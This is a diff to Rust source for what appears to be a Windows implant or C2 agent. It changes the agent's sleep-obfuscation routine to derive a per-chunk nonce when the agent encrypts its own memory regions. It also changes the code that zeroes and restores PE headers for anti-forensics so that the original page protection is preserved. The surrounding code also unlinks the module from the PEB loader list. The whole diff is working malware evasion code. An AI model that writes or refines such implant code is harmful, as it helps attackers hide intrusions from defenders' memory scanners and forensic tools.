@@ -425,16 +425,26 @@ fn encrypt_region_chunks(
     OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);
     let cipher = XChaCha20Poly1305::new_from_slice(key)
         .map_err(|_| anyhow!("XChaCha20-Poly1305 key init failed"))?;
-    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);
 
     let n_chunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
     let mut tags = Vec::with_capacity(n_chunks);
 
     let ptr = base as *mut u8;
     let mut offset = 0usize;
+    let mut chunk_idx: u32 = 0;
     while offset < size {
         let end = (offset + CHUNK_SIZE).min(size);
         let chunk_len = end - offset;
+
+        // Derive a unique nonce for this chunk by XORing the last 4 bytes
+        // of the base nonce with the chunk index (little-endian).
+        let mut chunk_nonce = nonce;
+        let ctr_bytes = chunk_idx.to_le_bytes();
+        chunk_nonce[NONCE_LEN - 4] ^= ctr_bytes[0];
+        chunk_nonce[NONCE_LEN - 3] ^= ctr_bytes[1];
+        chunk_nonce[NONCE_LEN - 2] ^= ctr_bytes[2];
+        chunk_nonce[NONCE_LEN - 1] ^= ctr_bytes[3];
+        let xnonce = XNonce::from_slice(&chunk_nonce[..NONCE_LEN]);
 
         // For AEAD we need to encrypt in-place but the API returns ct || tag.
         // Copy the chunk to a temp buffer, encrypt, write ciphertext back,
@@ -460,6 +470,7 @@ fn encrypt_region_chunks(
         tags.push(tag);
 
         offset = end;
+        chunk_idx += 1;
     }
 
     Ok((nonce, tags))
@@ -477,18 +488,27 @@ fn decrypt_region_chunks(
 ) -> Result<()> {
     let cipher = XChaCha20Poly1305::new_from_slice(key)
         .map_err(|_| anyhow!("XChaCha20-Poly1305 key init failed"))?;
-    let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);
 
     let ptr = base as *mut u8;
     let mut offset = 0usize;
-    let mut chunk_idx = 0usize;
+    let mut chunk_idx: u32 = 0;
 
     while offset < size {
         let end = (offset + CHUNK_SIZE).min(size);
         let chunk_len = end - offset;
-        let tag = tags.get(chunk_idx).ok_or_else(|| {
+        let tag = tags.get(chunk_idx as usize).ok_or_else(|| {
             anyhow!("missing tag for chunk {} of region {:p}", chunk_idx, base)
         })?;
+
+        // Reconstruct the per-chunk nonce: XOR last 4 bytes of base nonce
+        // with chunk index (matching the encryption side).
+        let mut chunk_nonce = *nonce;
+        let ctr_bytes = chunk_idx.to_le_bytes();
+        chunk_nonce[NONCE_LEN - 4] ^= ctr_bytes[0];
+        chunk_nonce[NONCE_LEN - 3] ^= ctr_bytes[1];
+        chunk_nonce[NONCE_LEN - 2] ^= ctr_bytes[2];
+        chunk_nonce[NONCE_LEN - 1] ^= ctr_bytes[3];
+        let xnonce = XNonce::from_slice(&chunk_nonce[..NONCE_LEN]);
 
         // Build ct || tag for decryption.
         let mut combined = Vec::with_capacity(chunk_len + TAG_LEN);
@@ -662,7 +682,10 @@ unsafe fn zero_pe_headers() {
 }
 
 /// Restore PE headers from the backed-up copy.
-unsafe fn restore_pe_headers(header_backup: &[u8]) {
+///
+/// `orig_prot` is the protection that was active before zeroing (captured by
+/// `backup_pe_headers`). Falls back to `PAGE_EXECUTE_READ` if `None`.
+unsafe fn restore_pe_headers(header_backup: &[u8], orig_prot: Option<u32>) {
     #[cfg(target_arch = "x86_64")]
     let base: *mut u8 = {
         let teb: usize;
@@ -685,13 +708,17 @@ unsafe fn restore_pe_headers(header_backup: &[u8]) {
     }
     if let Some(_old) = protect_memory(base, header_backup.len(), PAGE_READWRITE) {
         std::ptr::copy_nonoverlapping(header_backup.as_ptr(), base, header_backup.len());
-        // Restore to original executable protection.
-        let _ = protect_memory(base, header_backup.len(), PAGE_EXECUTE_READ);
+        // Restore to the exact original protection (not a hardcoded value).
+        let prot = orig_prot.unwrap_or(PAGE_EXECUTE_READ);
+        let _ = protect_memory(base, header_backup.len(), prot);
     }
 }
 
 /// Back up PE headers before zeroing.
-unsafe fn backup_pe_headers() -> Vec<u8> {
+///
+/// Returns `(header_bytes, original_protection)` so `restore_pe_headers`
+/// can restore the exact page protection rather than hardcoding a value.
+unsafe fn backup_pe_headers() -> (Vec<u8>, Option<u32>) {
     #[cfg(target_arch = "x86_64")]
     let base: *const u8 = {
         let teb: usize;
@@ -710,22 +737,31 @@ unsafe fn backup_pe_headers() -> Vec<u8> {
     let base: *const u8 = std::ptr::null();
 
     if base.is_null() {
-        return Vec::new();
+        return (Vec::new(), None);
     }
     let dos_e_magic = base as *const u16;
     if *dos_e_magic != 0x5A4D {
-        return Vec::new();
+        return (Vec::new(), None);
     }
     let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
     let nt_sig = base.add(e_lfanew) as *const u32;
     if *nt_sig != 0x4550 {
-        return Vec::new();
+        return (Vec::new(), None);
     }
     let size_of_headers = *(base.add(e_lfanew + 0x54) as *const u32) as usize;
     if size_of_headers == 0 || size_of_headers > 4096 {
-        return Vec::new();
+        return (Vec::new(), None);
     }
-    std::slice::from_raw_parts(base, size_of_headers).to_vec()
+    // Capture the current page protection so we can restore to the exact
+    // same value on wake (avoids hardcoding PAGE_EXECUTE_READ).
+    let orig_prot = protect_memory(base as *mut u8, size_of_headers, PAGE_READWRITE);
+    // Restore the protection immediately — zero_pe_headers will change it
+    // again shortly.
+    if let Some(p) = orig_prot {
+        let _ = protect_memory(base as *mut u8, size_of_headers, p);
+    }
+    let backup = std::slice::from_raw_parts(base, size_of_headers).to_vec();
+    (backup, orig_prot)
 }
 
 /// Unlink the agent's own module from the PEB_LDR_DATA list so that
@@ -1759,12 +1795,12 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     };
 
     // ── 5. Anti-forensics ──────────────────────────────────────────────────
-    let header_backup = if config.anti_forensics {
-        let backup = backup_pe_headers();
+    let (header_backup, header_orig_prot) = if config.anti_forensics {
+        let (backup, orig_prot) = backup_pe_headers();
         zero_pe_headers();
-        backup
+        (backup, orig_prot)
     } else {
-        Vec::new()
+        (Vec::new(), None)
     };
 
     let peb_links = if config.anti_forensics {
@@ -1950,7 +1986,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
         }
         // Restore PE headers.
         if !header_backup.is_empty() {
-            restore_pe_headers(&header_backup);
+            restore_pe_headers(&header_backup, header_orig_prot);
         }
     }
 
